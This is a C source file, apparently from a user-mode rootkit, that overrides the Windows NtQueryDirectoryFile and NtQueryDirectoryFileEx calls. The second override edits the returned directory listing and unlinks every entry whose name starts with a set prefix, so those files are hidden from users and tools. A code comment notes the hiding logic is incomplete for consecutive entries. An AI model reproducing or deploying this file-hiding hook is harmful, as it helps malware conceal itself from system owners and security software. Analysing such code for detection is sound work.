#include "pch.h"
#include "overridefuncs.h"
#include "types.h"

// define override functions
__kernel_entry NTSTATUS NTAPI OverrideNtQueryDirectoryFileEx(
	HANDLE                 FileHandle,
	HANDLE                 Event,
	PIO_APC_ROUTINE        ApcRoutine,
	PVOID                  ApcContext,
	PIO_STATUS_BLOCK       IoStatusBlock,
	PVOID                  FileInformation,
	ULONG                  Length,
	FILE_INFORMATION_CLASS FileInformationClass,
	BOOLEAN                ReturnSingleEntry,
	PUNICODE_STRING        FileName,
	BOOLEAN                RestartScan
)
{
	//Log(FileHandle, __FUNCTION__, FileInformationClass);

	NTSTATUS result = NtQueryDirectoryFileEx_static(
		FileHandle,
		Event,
		ApcRoutine,
		ApcContext,
		IoStatusBlock,
		FileInformation,
		Length,
		FileInformationClass,
		ReturnSingleEntry,
		FileName,
		RestartScan
	);


	return result;
}

__kernel_entry NTSTATUS NTAPI OverrideNtQueryDirectoryFile(
	HANDLE                 FileHandle,
	HANDLE                 Event,
	PIO_APC_ROUTINE        ApcRoutine,
	PVOID                  ApcContext,
	PIO_STATUS_BLOCK       IoStatusBlock,
	PVOID                  FileInformation,
	ULONG                  Length,
	FILE_INFORMATION_CLASS FileInformationClass,
	BOOLEAN                ReturnSingleEntry,
	PUNICODE_STRING        FileName,
	BOOLEAN                RestartScan
)
{
	//Log(FileHandle, __FUNCTION__, FileInformationClass);

	NTSTATUS result = NtQueryDirectoryFile_static(
		FileHandle,
		Event,
		ApcRoutine,
		ApcContext,
		IoStatusBlock,
		FileInformation,
		Length,
		FileInformationClass,
		ReturnSingleEntry,
		FileName,
		RestartScan
	);
	// TODO
	// fix extraction logic, in cases when two or more sequential nodes need to be hidden

	if (FileInformationClass == ClassFileIdBothDirectoryInformation && ReturnSingleEntry == FALSE)
	{
		PFILE_ID_BOTH_DIR_INFORMATION filelinkedlist = (PFILE_ID_BOTH_DIR_INFORMATION)FileInformation;
		while (filelinkedlist->NextEntryOffset != 0)
		{
			if (wcsncmp(GetNextNode(filelinkedlist)->FileName, WILDCARD, WILDCARDLEN) == 0)
			{
				// remove the WILDCARD node(s)
				filelinkedlist->NextEntryOffset += GetNextNode(filelinkedlist)->NextEntryOffset;
			}

			if (filelinkedlist->NextEntryOffset != 0)
				filelinkedlist = GetNextNode(filelinkedlist);
		}
	}

	return result;
}